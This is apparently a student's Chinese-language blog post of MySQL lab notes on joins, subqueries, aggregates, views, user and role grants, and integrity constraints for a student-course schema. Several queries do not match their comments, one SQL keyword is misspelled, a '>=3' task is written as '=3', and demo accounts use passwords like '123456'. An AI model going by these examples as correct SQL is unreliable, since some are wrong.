查询选2门课且成绩大于90</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select first.Cno,second.Cpno from course first,course second where first.Cpno=second.Cno; //自身连接 找到选修的选修课</span><br><span class=\"line\">+-----+------+</span><br><span class=\"line\">| Cno | Cpno |</span><br><span class=\"line\">+-----+------+</span><br><span class=\"line\">| 1   | 7    |</span><br><span class=\"line\">| 3   | 5    |</span><br><span class=\"line\">| 4   |      |</span><br><span class=\"line\">| 5   | 6    |</span><br><span class=\"line\">| 7   |      |</span><br><span class=\"line\">+-----+------+</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; SELECT Sname,Sage </span><br><span class=\"line\">from student,course,sc </span><br><span class=\"line\">where student.Sno=sc.Sno AND sc.Cno=course.Cno </span><br><span class=\"line\">AND Cname=&apos;database&apos;;//三表连接查询，查询选修了课程名为“数据结构”的学生学号(Sno)和姓名(Sname)。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,Sage from student,sc where sc.Sno=student.Sno;  //查询每个学生及其选修课程的情况。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select student.Sno,Sname,Cname,Grade from student,sc,course where student.Sno=sc.Sno AND sc.Cno=course.Cno; </span><br><span class=\"line\">//查询每个学生的学号(Sno)、姓名(Sname)、选修的课程名(Cname)及成绩(Grade)。 这里 Sno 值不唯一，因此要加上前缀</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"集合查询\"><a href=\"#集合查询\" class=\"headerlink\" title=\"集合查询\"></a>集合查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from student where Sdept=&apos;CS&apos; union select * from student where Sage&lt;=19; //UNION 联合查询，自动去重 查询计算机科学系的学生或年龄不大于20岁的学生信息。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,Ssex,Sage,Sdept from student where Sdept=&apos;CS&apos; or Sage&lt;=&apos;20&apos;; //查询计算机科学系的学生或年龄不大于20岁的学生信息</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,Ssex,Sage,Sdept from student where Sdept=&apos;math&apos; and Sage&lt;=&apos;20&apos;; //查询数学系的学生且年龄不大于20岁的学生的交集，这实际上就是查询数学系中年龄不大于20岁的学生。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from student where Sdept=&apos;math&apos; intersect select * from student where Sage&lt;=19; //查询数学系的学生且年龄不大于20岁的学生的交集，这实际上就是查询数学系中年龄不大于20岁的学生。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from student where Sdept=&apos;math&apos; execpt select * from student where Sage&lt;=19;//查询数学系的学生与年龄不大于20岁的学生的差集。</span><br><span class=\"line\"></span><br><span class=\"line\">INTERSECT 交操作 &amp; EXCEPT 差操作，在mysql中还不支持，一般用 not in 代替实现</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"嵌套查询\"><a href=\"#嵌套查询\" class=\"headerlink\" title=\"嵌套查询\"></a>嵌套查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT Sname,Sage </span><br><span class=\"line\">FROM student </span><br><span class=\"line\">WHERE Sno IN </span><br><span class=\"line\">    (SELECT Sno </span><br><span class=\"line\">    from sc </span><br><span class=\"line\">    WHERE Cno IN </span><br><span class=\"line\">        (SELECT Cno </span><br><span class=\"line\">        from course </span><br><span class=\"line\">        where Cname=&apos;database&apos;</span><br><span class=\"line\">        )</span><br><span class=\"line\">    ); //跨三个表查询，实现的效果与多表连接效果一样。查询选修了课程名为“数据结构”的学生学号(Sno)和姓名(Sname)。</span><br><span class=\"line\">    </span><br><span class=\"line\">mysql&gt; select student.Sno,Sname from student,course,sc where student.Sno=sc.Sno AND sc.Cno=course.Cno AND course.Cname=&apos;math&apos;; //查询选修了课程名为“数据结构”的学生学号(Sno)和姓名(Sname)。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"带-IN-和-ALL-的子查询\"><a href=\"#带-IN-和-ALL-的子查询\" class=\"headerlink\" title=\"带 IN 和 ALL 的子查询\"></a>带 <code>IN</code> 和 <code>ALL</code> 的子查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select Sname,Sage from student where Sage &lt;= ANY (select Sage from student where Sdept=&apos;IS&apos;); //查询非自动化系的不超过自动化系所有学生的年龄的学生姓名(Sname)和年龄(Sage)。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,Sdept from student where Sno in (select Sno from sc where Cno=&apos;2&apos;); //查询选修了编号为“C02”的课程的学生姓名(Sname)和所在系(Sdept)。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sno,Sname,Sdept from student where Sdept in (select sdept from student where Sname=&apos;WangMin&apos;);</span><br><span class=\"line\">//查询与“李伟”在同一个系学习的学生学号(Sno)、姓名(Sname)和系名(Sdept)。</span><br><span class=\"line\">此查询为不相关子查询，子查询条件不依赖于父条件。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"基于派生表的查询\"><a href=\"#基于派生表的查询\" class=\"headerlink\" title=\"基于派生表的查询\"></a>基于派生表的查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"sql高级查询\"><a href=\"#sql高级查询\" class=\"headerlink\" title=\"sql高级查询\"></a><code>sql</code>高级查询</h3><h4 id=\"聚集函数的使用\"><a href=\"#聚集函数的使用\" class=\"headerlink\" title=\"聚集函数的使用\"></a>聚集函数的使用</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL提供许多聚集函数，主要有：</span><br><span class=\"line\">- COUNT(*)                     统计元组个数</span><br><span class=\"line\">- COUNT([DISTINCT|ALL] &lt;列名&gt;) 统计一列中值的个数</span><br><span class=\"line\">- SUM([DISTINCT|ALL] &lt;列名&gt;)   计算一列值的总和，列必须是数值型</span><br><span class=\"line\">- AVG([DISTINCT|ALL] &lt;列名&gt;)   计算一列值的平均值，列必须是数值型</span><br><span class=\"line\">- MAX([DISTINCT|ALL] &lt;列名&gt;)   求一列值中的最大值</span><br><span class=\"line\">- MIN([DISTINCT|ALL] &lt;列名&gt;)   求一列值中的最小值</span><br><span class=\"line\">DISTINCT 短语对结果去重，默认 ALL</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">select count(*) from student;  //查询学生总人数</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select count(DISTINCT Sdept) from student; //查询有多少个专业</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select AVG(Grade) from sc where Cno=&apos;1&apos;; //计算选修C01号课程的学生平均成绩。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select MAX(Grade) from sc where Cno=&apos;1&apos;; //查询选修C01号课程的学生最高分数。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"查询结果分组\"><a href=\"#查询结果分组\" class=\"headerlink\" title=\"查询结果分组\"></a>查询结果分组</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select Cno,count(Sno) from sc group by Cno;</span><br><span class=\"line\">//求每门课的课程号(Cno)及相应的选课人数。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sno from sc having count(Cno)&gt;=3;</span><br><span class=\"line\">//查询选修了3门或3门以上课程的学生学号(Sno)。</span><br><span class=\"line\">这个是不对的，只是结果看起来对</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sno from sc group by Sno having count(*)=3; //查询选修了3门或3门以上课程的学生学号(Sno)。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"不同表之间的连接查询\"><a href=\"#不同表之间的连接查询\" class=\"headerlink\" title=\"不同表之间的连接查询\"></a>不同表之间的连接查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select student.Sname,student.Sdept,course.Cname from student,course,sc where student.Sno=sc.Sno and sc.Cno=course.Cno; //查询每个学生及其选修课程的情况。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select student.Sno,Sname,Cname,Grade from student,sc,course where student.Sno=sc.Sno AND sc.Cno=course.Cno; </span><br><span class=\"line\">//查询每个学生的学号(Sno)、姓名(Sname)、选修的课程名(Cname)及成绩(Grade)。 这里 Sno 值不唯一，因此要加上前缀</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select student.Sno,student.Sname,course.Cname,sc.Grade from student,course,sc where student.Sno=sc.Sno and sc.Cno=course.Cno and sc.Grade&gt;=90;//查询考试成绩在90分以上的学生学号(Sno)、姓名(Sname)、选修的课程名(Cname)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"带谓词-IN-的嵌套查询\"><a href=\"#带谓词-IN-的嵌套查询\" class=\"headerlink\" title=\"带谓词 IN 的嵌套查询\"></a>带谓词 IN 的嵌套查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select Sname,Sdept from student where Sno in (select Sno from sc where Cno=&apos;2&apos;); //查询选修了编号为“C02”的课程的学生姓名(Sname)和所在系(Sdept)。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sno,Sname,Sdept from student where Sdept in (select sdept from student where Sname=&apos;WangMin&apos;);</span><br><span class=\"line\">//查询与“李伟”在同一个系学习的学生学号(Sno)、姓名(Sname)和系名(Sdept)。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"视图\"><a href=\"#视图\" class=\"headerlink\" title=\"视图\"></a>视图</h2><h3 id=\"建立视图\"><a href=\"#建立视图\" class=\"headerlink\" title=\"建立视图\"></a>建立视图</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.1\t建立数学系学生的视图math_stu，并要求进行修改和插入操作时仍需保证该视图只有数学系的学生，视图的属性名为Sno，Sname，Sage，Sdept。</span><br><span class=\"line\">mysql&gt; create view math_stu</span><br><span class=\"line\">    -&gt; as select</span><br><span class=\"line\">    -&gt; Sno,Sname,Sage,Sdept</span><br><span class=\"line\">    -&gt; from student where Sdept=&apos;MATH&apos;;</span><br><span class=\"line\">Query OK, 0 rows affected (0.16 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from math_stu;</span><br><span class=\"line\">+-----------+--------+------+-------+</span><br><span class=\"line\">| Sno       | Sname  | Sage | Sdept |</span><br><span class=\"line\">+-----------+--------+------+-------+</span><br><span class=\"line\">| 201215124 | JingYu |   27 | MATH  |</span><br><span class=\"line\">+-----------+--------+------+-------+</span><br><span class=\"line\">1 row in set (0.10 sec)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1.2  建立学生的学号(Sno)、姓名(Sname)、选修课程名(Cname)及成绩(Grade)的视图grade_stu。</span><br><span class=\"line\">mysql&gt; create view grade_stu</span><br><span class=\"line\">    -&gt; as select</span><br><span class=\"line\">    -&gt; s.Sno,s.Sname,c.Cname,sc.Grade</span><br><span class=\"line\">    -&gt; from student s,course c,sc;</span><br><span class=\"line\">Query OK, 0 rows affected (0.12 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">这种方法创建完之后我们发现存在大量重复且错误的数据,猜想是因为没有指定表之间的关系导致的。下面这个是正确的查询方式。</span><br><span class=\"line\">mysql&gt; create view grade_stu</span><br><span class=\"line\">    -&gt; as select</span><br><span class=\"line\">    -&gt; s.Sno,s.Sname,c.Cname,sc.Grade</span><br><span class=\"line\">    -&gt; from student s,course c,sc</span><br><span class=\"line\">    -&gt; where s.Sno=sc.Sno and c.Cno=sc.Cno;</span><br><span class=\"line\">Query OK, 0 rows affected (0.12 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from grade_stu;</span><br><span class=\"line\">+-----------+---------+------------+-------+</span><br><span class=\"line\">| Sno       | Sname   | Cname      | Grade |</span><br><span class=\"line\">+-----------+---------+------------+-------+</span><br><span class=\"line\">| 201215121 | LiYong  | database   |    92 |</span><br><span class=\"line\">| 201215121 | LiYong  | infosystem |    85 |</span><br><span class=\"line\">| 201215121 | LiYong  | math       |    88 |</span><br><span class=\"line\">| 201215122 | LiuChen | math       |    90 |</span><br><span class=\"line\">| 201215122 | LiuChen | infosystem |    80 |</span><br><span class=\"line\">+-----------+---------+------------+-------+</span><br><span class=\"line\">5 rows in set (0.33 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">我们还可以尝试 left join &amp; right join 的方式，本质上完全一样：</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; create view grade_stu</span><br><span class=\"line\">    -&gt; as select</span><br><span class=\"line\">    -&gt; s.Sno,s.Sname,c.Cname,sc.Grade</span><br><span class=\"line\">    -&gt; from sc</span><br><span class=\"line\">    -&gt; left join student s on s.Sno=sc.Sno</span><br><span class=\"line\">    -&gt; left join course c on c.Cno=sc.Cno;</span><br><span class=\"line\">Query OK, 0 rows affected (0.11 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">1.3  定义一个反映学生出生年份的视图Student_birth。</span><br><span class=\"line\">mysql&gt; create view Student_brith (s_name,s_brith) as select Sname,2020-student.Sage from student;</span><br><span class=\"line\"></span><br><span class=\"line\">1.4 定义一个视图AVGG，视图列中有课程号、这门课程的平均成绩，且平均成绩大于80分。</span><br><span class=\"line\">mysql&gt; create view AVGG (cno,avg_grade) as select Cno,AVG(Grade) from sc group by Cno HAVING AVG(Grade)&gt;80;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"删除视图\"><a href=\"#删除视图\" class=\"headerlink\" title=\"删除视图\"></a>删除视图</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; drop view if exists grade_stu;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查询视图\"><a href=\"#查询视图\" class=\"headerlink\" title=\"查询视图\"></a>查询视图</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3.1 在数学系的学生视图math_stu中找出年龄(Sage)小于20岁的学生姓名(Sname)和年龄(Sage)。</span><br><span class=\"line\">mysql&gt; select Sname,Sage from math_stu where Sage&lt;20;</span><br><span class=\"line\"></span><br><span class=\"line\">3.2  在grade_stu视图中查询成绩在85分以上的学生学号(Sno)、姓名(Sname)和课程名称(Cname)。</span><br><span class=\"line\">mysql&gt; select Sno,Sname,Cname from grade_stu where Grade&gt;85;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"更新视图\"><a href=\"#更新视图\" class=\"headerlink\" title=\"更新视图\"></a>更新视图</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">语法：ALTER VIEW &lt;视图名&gt; AS &lt;SELECT语句&gt;</span><br></pre></td></tr></table></figure>\n\n<p>需要注意的是，对于 ALTER VIEW 语句的使用，需要用户具有针对视图的 CREATE VIEW 和 DROP 权限，以及由 SELECT 语句选择的每一列上的某些权限。</p>\n<p> 修改视图的定义，除了可以通过 ALTER VIEW 外，也可以使用 DROP VIEW 语句先删除视图，再使用 CREATE VIEW 语句来实现。</p>\n<p>视图是一个虚拟表，实际的数据来自于基本表，所以通过插入、修改和删除操作更新视图中的数据，实质上是在更新视图所引用的基本表的数据。</p>\n<p>注意：对视图的修改就是对基本表的修改，因此在修改时，要满足基本表的数据定义。</p>\n<p>某些视图是可更新的。也就是说，可以使用 UPDATE、DELETE 或 INSERT 等语句更新基本表的内容。对于可更新的视图，视图中的行和基本表的行之间必须具有一对一的关系。</p>\n<p>还有一些特定的其他结构，这些结构会使得视图不可更新。更具体地讲，如果视图包含以下结构中的任何一种，它就是不可更新的：</p>\n<ul>\n<li>聚合函数 SUM()、MIN()、MAX()、COUNT() 等。</li>\n<li>DISTINCT 关键字。</li>\n<li>GROUP BY 子句。</li>\n<li>HAVING 子句。</li>\n<li>UNION 或 UNION ALL 运算符。</li>\n<li>位于选择列表中的子查询。</li>\n<li>FROM 子句中的不可更新视图或包含多个表。</li>\n<li>WHERE 子句中的子查询，引用 FROM 子句中的表。</li>\n<li>ALGORITHM 选项为 TEMPTABLE（使用临时表总会使视图成为不可更新的）的时候。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4.1 将数学系学生视图math_stu中学号为200215123的学生姓名改为“黄海”。</span><br><span class=\"line\">mysql&gt; update math_stu set Sname=&apos;huanghai&apos; where Sno=&apos;201215124&apos;;</span><br><span class=\"line\">我们再去查询基本表发现 studnet 表中的数据已经被修改。</span><br><span class=\"line\"></span><br><span class=\"line\">4.2  向数学系学生视图math_stu中插入一个新的学生记录，其中学号为“S09”，姓名为“王海”，年龄为20岁。</span><br><span class=\"line\">mysql&gt; INSERT INTO math_stu (Sno,Sname,Sage,Sdept) values (&apos;s09&apos;,&apos;wanghai&apos;,20,&apos;MATH&apos;);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"用户\"><a href=\"#用户\" class=\"headerlink\" title=\"用户\"></a>用户</h2><h3 id=\"创建用户\"><a href=\"#创建用户\" class=\"headerlink\" title=\"创建用户\"></a>创建用户</h3><p>可以使用 CREATE USER 语句来创建一个或多个 MySQL 账户，并设置相应的口令。</p>\n<p> 语法格式：</p>\n<p><code>CREATE USER &lt;用户名&gt; [ IDENTIFIED ] BY [ PASSWORD ] &lt;口令&gt;</code></p>\n<p>语法说明如下：</p>\n<p> 1) &lt;用户名&gt;</p>\n<p>指定创建用户账号，格式为 ‘user_name’@’host_name’。这里<code>user_name</code>是用户名，<code>host_name</code>为主机名，即用户连接 MySQL 时所在主机的名字。若在创建的过程中，只给出了账户的用户名，而没指定主机名，则主机名默认为“%”，表示一组主机。</p>\n<p> 2) PASSWORD</p>\n<p>可选项，用于指定散列口令，即若使用明文设置口令，则需忽略<code>PASSWORD</code>关键字；若不想以明文设置口令，且知道 PASSWORD() 函数返回给密码的散列值，则可以在口令设置语句中指定此散列值，但需要加上关键字<code>PASSWORD</code>。</p>\n<p> 3) IDENTIFIED BY子句</p>\n<p>用于指定用户账号对应的口令，若该用户账号无口令，则可省略此子句。</p>\n<p> 4) &lt;口令&gt;</p>\n<p>指定用户账号的口令，在<code>IDENTIFIED BY</code>关键字或<code>PASSWOED</code>关键字之后。给定的口令值可以是只由字母和数字组成的明文，也可以是通过 PASSWORD() 函数得到的散列值。</p>\n<p> 使用 CREATE USER 语句应该注意以下几点：</p>\n<ul>\n<li>如果使用 CREATE USER 语句时没有为用户指定口令，那么 MySQL 允许该用户可以不使用口令登录系统，然而从安全的角度而言，不推荐这种做法。</li>\n<li>使用 CREATE USER 语句必须拥有 MySQL 中 MySQL 数据库的 INSERT 权限或全局 CREATE USER 权限。</li>\n<li>使用 CREATE USER 语句创建一个用户账号后，会在系统自身的 MySQL 数据库的 user 表中添加一条新记录。若创建的账户已经存在，则语句执行时会出现错误。</li>\n<li>新创建的用户拥有的权限很少。他们可以登录 MySQL，只允许进行不需要权限的操作，如使用 SHOW 语句查询所有存储引擎和字符集的列表等。</li>\n</ul>\n<p> 如果两个用户具有相同的用户名和不同的主机名，MySQL 会将他们视为不同的用户，并允许为这两个用户分配不同的权限集合。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5.1创建两个用户，一个以你的名字（汉语拼音）命名的用户，登陆名也为你的名字（汉语拼音），另一个为你同学（汉语拼音）的名字命名的一个用户，登录名为你同学的名字（汉语拼音）。</span><br><span class=\"line\">mysql&gt; create user &apos;brain&apos;@&apos;localhost&apos; identified by &apos;123456&apos;;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; create user &apos;fuck&apos;@&apos;localhost&apos; identified by &apos;321654&apos;;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"用户权限\"><a href=\"#用户权限\" class=\"headerlink\" title=\"用户权限\"></a>用户权限</h3><h3 id=\"角色\"><a href=\"#角色\" class=\"headerlink\" title=\"角色\"></a>角色</h3><p>通常，MySQL 数据库拥有多个相同权限集合的用户。以前，向多个用户授予和撤销权限的唯一方法是单独更改每个用户的权限，假如用户数量比较多的时候，这是非常耗时的。<a href=\"https://www.yiibai.com/mysql/roles.html\" target=\"_blank\" rel=\"noopener\">MySql 角色</a></p>\n<p>为了用户权限管理更容易，MySQL提供了一个名为<code>role</code>的新对象，它是一个命名的特权集合。</p>\n<p>如果要向多个用户授予相同的权限集，则应如下所示：</p>\n<ul>\n<li><em>首先</em>，创建新的角色。</li>\n<li><em>第二</em>，授予角色权限。</li>\n<li><em>第三</em>，授予用户角色。</li>\n</ul>\n<p>如果要更改用户的权限，则需要仅更改授权角色的权限。这些更改角色的权限将对授予角色的所有用户生效。</p>\n<p>假设您开发了一个使用<code>crmdb</code>数据库的应用程序。要与<code>crmdb</code>数据库进行交互，您需要为需要完全访问数据库的开发人员创建帐户。此外，需要为仅需读取访问权限的用户创建帐户，以及为读取/写入访问权限的用户创建帐户。</p>\n<p>要避免单独为每个用户帐户授予权限，您可以创建一组角色，并为每个用户帐户授予相应的角色。</p>\n<p>要创建新角色，请使用<code>CREATE ROLE</code>语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5.2在学生管理数据库上创建两个角色R1和R2，把你这个用户放入R1和把你同学的用户放入角色R2中。</span><br><span class=\"line\">create role if not exists &apos;R1&apos;,&apos;R2&apos;；</span><br><span class=\"line\">GRANT R1 TO brain@localhost;</span><br><span class=\"line\">GRANT R2 TO fuck@localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">5.3给角色R1授权，使其可以查询学生管理数据库中的student表以及查询视图math_stu。</span><br><span class=\"line\">grant select on studentinfo.student to R1;</span><br><span class=\"line\">set default role R1 to brain@localhost;</span><br><span class=\"line\">要在每次用户帐户连接到数据库服务器时指定哪些角色应该处于活动状态，请使用SET DEFAULT ROLE语句。</span><br><span class=\"line\"></span><br><span class=\"line\">5.4给角色R2授权，使其可以插入和更新学生管理数据库中的student表</span><br><span class=\"line\">grant insert,update on studentinfo.student to R2;</span><br><span class=\"line\">set default role R2 to fuck@localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">5.5请分别以你自己名字命名的用户和你同学（汉语拼音）的名字命名的用户分别登录学生管理数据库对student表查询，再对student表进行插入和更新，看看分别是什么结果。</span><br><span class=\"line\"> mysql -h localhost -u brain -p 123456</span><br><span class=\"line\"> select * from student; //此时用户是R1，查询成功，但是无法使用 insert 或者 update 因为我们只赋予了他一个权限。</span><br><span class=\"line\"> </span><br><span class=\"line\">5.6 把角色R1的中对student表查询的权限收回。</span><br><span class=\"line\">REVOKE SELECT ON studentinfo.student from R1;</span><br><span class=\"line\"></span><br><span class=\"line\">5.7再次以你自己名字命名的用户登录学生管理数据库对student表查询看是什么结果。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"数据库完整性\"><a href=\"#数据库完整性\" class=\"headerlink\" title=\"数据库完整性\"></a>数据库完整性</h2><p>数据库的完整性 ( integrity ) 是指数据的正确性 ( correctness) 和相容性 (compat-ability) .</p>\n<p>为了维护数据库的完整性，需要实现：</p>\n<ul>\n<li>提供定义完整性约束条件的机制</li>\n<li>提供完整性检查方法：一般在 <code>INSERT,UPDATE,DELETE</code> 语句执行后开始检查，也可以在事务提交时检查。</li>\n<li>进行违约处理</li>\n</ul>\n<p>关系数据库管理系统使得完整性控制成为其核心支持的功能，从而能够为所有用户和应用提供一致的数据库完整性。</p>\n<h3 id=\"实体完整性\"><a href=\"#实体完整性\" class=\"headerlink\" title=\"实体完整性\"></a>实体完整性</h3><p>关系模型的实体完整性在 <code>CREATE TABLE</code> 中用 <code>PRIMARY KEY</code> 定义。单属性码有两种说明方法：列级约束条件和表级约束条件；多属性码只有表级约束条件。</p>\n<h4 id=\"实体完整性检查和违约处理\"><a href=\"#实体完整性检查和违约处理\" class=\"headerlink\" title=\"实体完整性检查和违约处理\"></a>实体完整性检查和违约处理</h4><p>定义完关系的主码之后，每当用户程序对基本表插入一条记录或者对主码列进行更新操作时，会进行实体完整性检查：</p>\n<ul>\n<li>检查主码是否唯一，不唯一则拒绝插入或修改</li>\n<li>检查主码的各个属性是否为空，有一个为空就拒绝插入或修改</li>\n</ul>\n<p>使用<code>B+</code> 索引树来查找基本表是否已经存在新的主码值。</p>\n<h3 